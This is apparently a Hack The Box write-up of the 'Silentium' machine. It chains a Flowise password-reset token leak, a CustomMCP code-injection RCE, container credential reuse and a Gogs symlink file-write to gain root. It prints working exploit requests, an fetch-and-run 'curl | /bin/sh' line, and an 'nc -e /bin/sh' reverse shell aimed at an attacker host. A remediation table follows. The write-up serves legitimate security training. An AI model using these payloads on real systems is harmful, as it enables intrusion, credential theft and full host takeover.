# Write-Up — Silentium: Flowise Account Takeover to Container RCE to Root via Gogs Symlink Abuse

> **Type:** Web Application / Container / Linux Penetration Test (HTB, Easy)
> **Target:** `10.129.118.17` (`silentium.htb`)
> **Tools:** Nmap, ffuf, dirsearch, curl/jq, netcat, git, SSH
> **Final Result:** Root access via a chained path: Flowise password-reset token disclosure → account takeover → CustomMCP RCE inside a Docker container → leaked SMTP credentials → SSH as `ben` → Gogs symlink arbitrary file write to root's `authorized_keys`

---

## 1. Introduction

The target hosts a financial services company website, fronting a **Flowise** AI-workflow application on a staging subdomain and an internal **Gogs** Git service on a second vhost. The objective was to enumerate hidden subdomains, exploit two chained Flowise vulnerabilities to gain code execution, escape the resulting Docker container context via leaked credentials, and finally abuse a Gogs symlink-handling flaw to write directly to root's SSH authorized_keys.

This box is a strong demonstration of chaining multiple **recent, real CVEs** together rather than relying on any single "big" exploit:

- **CVE-2025-58434** — an unauthenticated password reset token disclosure in Flowise, allowing full account takeover once a valid email/username is known.
- **CVE-2025-59528** — unsafe evaluation of a user-supplied configuration parameter in Flowise's CustomMCP node, leading to remote code execution.
- **Container escape via credential leakage** — environment variables inside the resulting Docker container disclosed real host credentials.
- **CVE-2025-8110** — a Gogs vulnerability allowing an authenticated user to abuse symbolic links via the repository content API to overwrite arbitrary files outside the intended repository.

---

## 2. Reconnaissance

### 2.1 Full Port Scan

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.118.17 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.118.17
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu 3ubuntu13.15) |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) |

### 2.2 Adding the Hostname

```bash
echo "10.129.118.17 silentium.htb" | sudo tee -a /etc/hosts
```

Browsing `http://silentium.htb` displayed a financial services company website with limited functionality — insufficient to progress further without additional enumeration.

---

## 3. Subdomain Enumeration

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FFUZ -H "Host: FFUZ.silentium.htb" -u http://silentium.htb -ic
```

Most responses returned a consistent size of `178` bytes (a default/wildcard vhost response), filtered out with `-fs 178`:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FFUZ -H "Host: FFUZ.silentium.htb" -u http://silentium.htb -ic -fs 178
```

This isolated a genuine subdomain:

```
staging [Status: 200, Size: 3142]
```

```bash
echo "10.129.118.17 staging.silentium.htb" | sudo tee -a /etc/hosts
```

Visiting it displayed a **Sign In** page requesting an email and password — no credentials were available yet.

---

## 4. Web Application Enumeration

### 4.1 Directory Fuzzing

```bash
dirsearch -u http://staging.silentium.htb
```

Notable results:

```
401 - /api/v1/
401 - /api/v1/swagger.json
301 - /assets -> /assets/
200 - /favicon.ico
200 - /manifest.json
```

### 4.2 Identifying the Application

```bash
curl http://staging.silentium.htb/manifest.json
```

The manifest's `short_name`/`name` fields identified the application as **Flowise**.

### 4.3 Enumerating the API and Version

```bash
dirsearch -u http://staging.silentium.htb/api/v1
```

```
200 - /api/v1/version
```

```bash
curl http://staging.silentium.htb/api/v1/version
```

```json
{"version":"3.0.5"}
```

---

## 5. Vulnerability Analysis — Account Takeover (CVE-2025-58434)

### 5.1 The Vulnerability

- **CVE:** CVE-2025-58434
- **Type:** Unauthenticated password reset token disclosure leading to full account takeover
- **Authentication:** None required — only a valid email/username is needed
- **Impact:** Full takeover of any Flowise account, including administrators

### 5.2 Enumerating a Valid Username

The public landing page referenced a systems/infrastructure lead named **Ben**. Requesting a password reset for a nonexistent user returned a `user not found` error, confirming the forgot-password flow was vulnerable to **username enumeration**. Testing `ben@silentium.htb` did not return this error, confirming it as a valid account.

### 5.3 Exploiting the Token Disclosure

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}' | jq
```

The response — intended only to trigger an email — instead returned the **full user object in the API response itself**, including the temporary reset token:

```json
{
  "user": {
    "email": "ben@silentium.htb",
    "credential": "$2a$05$...",
    "tempToken": "ERqdJMJKVEazWDQgJ2uC7JqheNpM73xUeMMrSElnEaMc20rC6L0W8qZmoNxcBEIM",
    "tokenExpiry": "2026-08-31T09:48:13.347Z"
  }
}
```

### 5.4 Completing the Account Takeover

Using the disclosed `tempToken` on the password reset page, Ben's password was reset to an attacker-known value. Logging in with the new credentials succeeded, granting full access to the Flowise application as Ben's account.

---

## 6. Initial Access — RCE via CustomMCP (CVE-2025-59528)

### 6.1 The Vulnerability

- **CVE:** CVE-2025-59528
- **Type:** Remote code execution via unsafe evaluation of the user-supplied `mcpServerConfig` parameter in Flowise's CustomMCP node
- **Authentication:** A valid Flowise API key (available post-takeover)
- **Impact:** Arbitrary Node.js code execution, and by extension OS command execution, within the Flowise application container

### 6.2 Confirming Code Execution

Using the pre-existing API key found in the account's API Keys section:

```bash
python3 -m http.server 5050
```

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <API_KEY>" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"curl <ATTACKER_IP>:5050\");return 1;})()})"
    }
  }'
```

The local HTTP server logged an inbound `GET /` request from the target, confirming successful command execution.

### 6.3 Escalating to a Reverse Shell

```bash
echo -e '#!/bin/sh\nnc <ATTACKER_IP> 4455 -e /bin/sh' > script.sh
```

```bash
nc -lnvp 4455
```

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <API_KEY>" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"curl <ATTACKER_IP>:5050/script.sh |/bin/sh\");return 1;})()})"
    }
  }'
```

The listener caught a connection:

```bash
id
```

```
uid=0(root) gid=0(root) ...
```

> **Severity: Critical.** Chained together, an unauthenticated token-disclosure bug and an authenticated RCE flaw produced full code execution starting from zero credentials.

---

## 7. Lateral Movement — Escaping the Container

### 7.1 Confirming a Container Context

```bash
ls -la /
```

The presence of a `.dockerenv` file at the filesystem root confirmed the shell was running **inside a Docker container**, despite the `root`-looking `id` output — a reminder that root inside a container is not equivalent to root on the host.

### 7.2 Harvesting Environment Variables

```bash
env
```

```
FLOWISE_PASSWORD=F1l3_d0ck3r
SENDER_EMAIL=ben@silentium.htb
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
```

The `SENDER_EMAIL` matched Ben's account, and the adjacent `SMTP_PASSWORD` was a strong candidate for **credential reuse** on the actual host.

### 7.3 SSH Access as ben

```bash
ssh ben@10.129.118.17
```

The SMTP password succeeded for SSH login as `ben` on the host — outside the container entirely.

### 7.4 User Flag

```bash
cat /home/ben/user.txt
```

This returned the user flag.

---

## 8. Privilege Escalation — Gogs Symlink Arbitrary Write (CVE-2025-8110)

### 8.1 Discovering the Internal Gogs Service

```bash
cat /etc/nginx/sites-enabled/staging-v2-code
```

```nginx
server {
    listen 80;
    server_name staging-v2-code.dev.silentium.htb;
    location / {
        proxy_pass http://127.0.0.1:3001;
        ...
    }
}
```

```bash
echo "10.129.118.17 staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
```

Visiting the domain revealed a **Gogs** self-hosted Git service. A free account was registered and used to log in, though no existing repositories were visible.

### 8.2 Identifying the Version

```bash
/opt/gogs/gogs/gogs --version
```

```
Gogs version 0.13.3
```

A search for vulnerabilities in this version identified **CVE-2025-8110**.

### 8.3 The Vulnerability

- **CVE:** CVE-2025-8110
- **Type:** Symbolic link abuse via the Gogs repository contents API
- **Authentication:** Any authenticated Gogs user
- **Impact:** Arbitrary file write/overwrite anywhere the Gogs service account has filesystem access

The repository content-update API, when applied to a path that is a **symbolic link** within a repository, follows the link and writes to its target rather than replacing the symlink itself or refusing the operation — allowing an authenticated but otherwise unprivileged user to overwrite files entirely outside their own repository.

### 8.4 Setting Up the Malicious Repository

A new repository (`test`) was created and cloned locally:

```bash
git clone http://staging-v2-code.dev.silentium.htb/test/test.git
cd test
```

A symbolic link was created pointing at root's SSH authorized_keys file:

```bash
ln -s /root/.ssh/authorized_keys overwrite_me
git config --global user.email "test@htb.com"
git config --global user.name "test"
git commit -m "symlink abuse"
git push
```

### 8.5 Retrieving the Blob SHA

```bash
git ls-tree HEAD overwrite_me
```

```
120000 blob 9c87fc525b63ebd989fa409533d3be1b295d6ec3 overwrite_me
```

### 8.6 Generating an API Token

A Gogs API token was generated via **Applications → Generate New Token**.

### 8.7 Preparing the Payload

```bash
echo "ssh-ed25519 AAAA...<attacker_pubkey>... fury@kali" | base64
```

### 8.8 Triggering the Overwrite

```bash
curl -X PUT \
  -H "Authorization: token <GOGS_TOKEN>" \
  -H "Content-Type: application/json" \
  "http://staging-v2-code.dev.silentium.htb/api/v1/repos/test/test/contents/overwrite_me?ref=master" \
  -d '{
    "message": "overwrite via symlink",
    "content": "<BASE64_SSH_PUBLIC_KEY>",
    "sha": "9c87fc525b63ebd989fa409533d3be1b295d6ec3"
  }' | jq
```

The response confirmed the update succeeded and that the target was still recognized as a symlink pointing to `/root/.ssh/authorized_keys` — confirming the attacker's public key had been written directly to root's authorized_keys file.

### 8.9 Root Access via SSH

```bash
ssh root@10.129.118.17
```

The key-based login succeeded immediately.

### 8.10 Root Flag

```bash
cat /root/root.txt
```

This returned the final flag, completing the machine.

> **Severity: Critical.** An authenticated symlink-handling flaw in a self-hosted Git service allowed any registered user — including one who self-registered with no prior access — to write arbitrary content to any file the service account could reach, including root's SSH configuration.

---

## 9. Full Attack Chain

```
[ Recon: Nmap → silentium.htb landing page ]
       │
       ▼
[ ffuf vhost fuzzing → staging.silentium.htb discovered ]
       │
       ▼
[ manifest.json + /api/v1/version → Flowise 3.0.5 identified ]
       │
       ▼
[ CVE-2025-58434: forgot-password username enum → ben@silentium.htb confirmed ]
       │
       ▼
[ forgot-password response leaks tempToken → password reset → account takeover ]
       │
       ▼
[ CVE-2025-59528: CustomMCP mcpServerConfig → RCE confirmed via HTTP callback ]
       │
       ▼
[ Reverse shell via script.sh piped to /bin/sh ]
       │
       ▼
[ .dockerenv found → container context confirmed ]
       │
       ▼
[ env → SMTP_PASSWORD + SENDER_EMAIL (ben) leaked ]
       │
       ▼
[ SSH as ben (credential reuse) → user.txt read ]
       │
       ▼
[ /etc/nginx/sites-enabled/staging-v2-code → internal Gogs vhost discovered ]
       │
       ▼
[ Gogs 0.13.3 identified → CVE-2025-8110 applicable ]
       │
       ▼
[ Repo created, symlink to /root/.ssh/authorized_keys committed and pushed ]
       │
       ▼
[ Gogs API PUT request → symlink followed → attacker SSH key written to root's authorized_keys ]
       │
       ▼
[ ssh root@[TARGET_IP] → root.txt read ]
```

**Lesson:** No single exploit in this chain was exotic — each was a documented, recent CVE. The skill demonstrated was recognizing how a container-scoped "root" shell, leaked environment variables, an internal-only vhost, and a Git server's API all connected into a complete path to host-level root.

---

## 10. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|--------------|
| 1 | Flowise forgot-password endpoint allows username enumeration | **Medium** | Return identical, generic responses regardless of whether the submitted email exists, to prevent account enumeration. |
| 2 | Flowise password-reset API response discloses the full user object, including the reset token, directly in the HTTP response | **Critical** | Never return sensitive tokens or credential material in an API response body; deliver reset tokens only via the registered out-of-band channel (email), and patch to a version fixing CVE-2025-58434. |
| 3 | Flowise CustomMCP node evaluates user-supplied `mcpServerConfig` unsafely | **Critical** | Patch to a version fixing CVE-2025-59528. Never evaluate user-controllable configuration as executable code; use a strict schema-validated configuration format instead. |
| 4 | Sensitive credentials (SMTP password, Flowise password) exposed as container environment variables readable by the running application | **High** | Use a secrets manager or mounted secret files with restrictive permissions instead of plain environment variables for credentials, especially inside containers that also process untrusted input. |
| 5 | Credential reuse between the container's SMTP password and the host `ben` SSH account | **High** | Enforce unique credentials per system/purpose; rotate any credential that has been used in more than one context. |
| 6 | Internal Gogs instance running version 0.13.3, vulnerable to CVE-2025-8110 (symlink arbitrary write) | **Critical** | Upgrade Gogs to a patched version. As defense in depth, the repository content API should refuse to follow symlinks when writing content, and the Gogs service account should not run with write access to sensitive paths like `/root/.ssh/`. |
| 7 | Self-registration enabled on an internal Git service reachable from a compromised low-privilege account | **Medium** | Disable open self-registration on internal developer tooling; require administrator approval or SSO-gated access for services with this level of trust. |

---

## 11. Conclusion

This box is a compact illustration of principles that scale directly to real-world environments increasingly built around AI/workflow tooling and self-hosted developer infrastructure:

1. **Newer application categories (AI workflow builders like Flowise) carry the same class of vulnerabilities as any other web app** — authentication flaws, unsafe deserialization/evaluation of user input — just with unfamiliar-sounding feature names (like "CustomMCP nodes").
2. **A root shell inside a container is not the objective — it's a pivot point.** The `.dockerenv` check is a five-second step that fundamentally changes what "compromise" means at that stage.
3. **Environment variables are a routine, high-value target once any code execution is achieved**, and credential reuse across service boundaries (container SMTP creds → host SSH) remains one of the most reliable escalation techniques in practice.

The fix, as with most findings of this class, is layered discipline: patch known CVEs across every application in the stack (not just the internet-facing one), never leak secrets in API responses or plaintext environment variables, and enforce unique credentials everywhere — especially between a container's application-level secrets and the underlying host's authentication.
